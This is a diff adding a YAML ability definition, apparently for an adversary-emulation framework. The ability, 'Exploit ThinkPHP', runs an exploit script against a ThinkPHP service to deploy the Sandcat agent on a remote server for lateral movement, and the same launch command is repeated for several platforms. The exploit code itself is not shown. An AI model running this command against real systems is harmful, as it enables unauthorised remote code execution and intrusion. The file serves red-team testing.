@@ -1,0 +1,45 @@
+---
+
+- id: a5e34950-0687-4dae-b090-4a835e01c68d
+  name: Exploit ThinkPHP
+  description: Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server
+  tactic: Lateral-Movement
+  technique:
+    attack_id: T1210
+    name: Exploitation of Remote Services
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 thinkphp-exploit.py -i #{remote.service.thinkphp} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
+    darwin:
+      sh:
+        command: |
+          python3 thinkphp-exploit.py -i #{remote.service.thinkphp} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
+    windows:
+      psh:
+        command: |
+           python3 thinkphp-exploit.py -i #{remote.service.thinkphp} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
+      cmd:
+        command: |
+          python3 thinkphp-exploit.py -i #{remote.service.thinkphp} -s #{server}
+        payload: thinkphp-exploit.py
+        parser:
+          name: line
+          property: remote.vuln.thinkphp_user
+          script: ''
